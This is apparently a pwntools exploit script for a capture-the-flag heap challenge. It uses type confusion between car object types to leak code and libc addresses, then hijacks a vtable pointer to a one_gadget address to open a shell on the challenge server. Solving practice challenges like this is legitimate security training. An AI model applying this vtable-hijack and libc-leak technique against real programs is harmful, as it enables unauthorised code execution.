###Object Type confusion -> vtable hijacking
###cout on extremely long string that overlapsunreadable area causes stdout to break, but does not crash program, should investigate more
###Doesn't work on remote(stdout breaks before any content in leaked), and i suspect there are no other possible solutions

from pwn import *

###Structure
'''
car
    |   4   |   4   |   4   |   4   |
0x00|  vtable_print |  cond | amount|
0x10|     price     |  string_name  |
0x20|          string_name          |
0x30|  string_name  |

big_car
    |   4   |   4   |   4   |   4   |
0x00|  vtable_print |  cond | amount|
0x10|     price     |  string_name  |
0x20|          string_name          |
0x30|  string_name  |    gasoline   |
0x40|         string_remark         |
0x50|         string_remark         |

small_car
    |   4   |   4   |   4   |   4   |
0x00|  vtable_print |  cond | amount|
0x10|     price     |  string_name  |
0x20|          string_name          |
0x30|  string_name  | string_remark |
0x40|         string_remark         |
0x50| string_remark |
'''

###Util
def buy(price,name,remark,Type='small',gasoline=None,silent=False):
    if silent is False:
        r.sendlineafter('choice: ','1')
        if Type=='small':
            r.sendlineafter('choice: ','1')
        else:
            r.sendlineafter('choice: ','2')
        r.sendlineafter('price: ',str(price))
        r.sendlineafter('name: ',name)
        r.sendlineafter('remark: ',remark)
        if Type!='small':
            r.sendlineafter('gasoline: ',str(gasoline))
    else:
        r.sendline('1')
        if Type=='small':
            r.sendline('1')
        else:
            r.sendline('2')
        r.sendline(str(price))
        r.sendline(name)
        r.sendline(remark)
        if Type!='small':
            r.sendline(str(gasoline))


def sell(idx,Type='small'):
    r.sendlineafter('choice: ','2')
    if Type=='small':
        r.sendlineafter('choice: ','1')
    else:
        r.sendlineafter('choice: ','2')
    r.sendlineafter('sell: ',str(idx))

def show(idx,Type='small',silent=False):
    if silent is False:
        r.sendlineafter('choice: ','3')
        if Type=='small':
            r.sendlineafter('choice: ','1')
        else:
            r.sendlineafter('choice: ','2')
        r.sendlineafter('show: ',str(idx))
    else:
        r.sendline('3')
        if Type=='small':
            r.sendline('1')
        else:
            r.sendline('2')
        r.sendline(str(idx))

###Addr
big_car_print_offset = 0x17f4
big_car_print_vtable_offset = 0x203c88
setbuf_got_offset = 0x203fa0
setbuf_offset = 0x884d0
system_offset = 0x4f440
one_gadget = 0x10a38c

###Exploit
r = remote('nc.eonew.cn',10014)

buy(0,'M30W','M30W',Type='big',gasoline=0)
buy(0,'M30W',p32(102),Type='big',gasoline=0)
show(3,Type='big')
r.recvuntil('name: ')
big_car_print_addr = u64(r.recv(8))
code_base = big_car_print_addr-big_car_print_offset
print(hex(code_base))
cnt = 0
leak = b''
while cnt<(setbuf_got_offset+8)-(big_car_print_vtable_offset+8):
    res = r.recv()
    cnt+=len(res)
    leak+=res
setbuf_addr = u64(leak[setbuf_got_offset-(big_car_print_vtable_offset+8):(setbuf_got_offset+8)-(big_car_print_vtable_offset+8)])
libc_base = setbuf_addr-setbuf_offset
print(hex(setbuf_addr))
print(hex(libc_base))
while len(r.recv(timeout=1))!=0:
    pass

buy(0,'M30W','M30W',Type='small',silent=True)
#buy(0,p64(libc_base+system_offset).ljust(101,b'\x00'),'M30W',Type='small',silent=True)
buy(0,p64(libc_base+one_gadget).ljust(101,b'\x00'),'M30W',Type='small',silent=True)
show(2,Type='small',silent=True)

r.interactive()
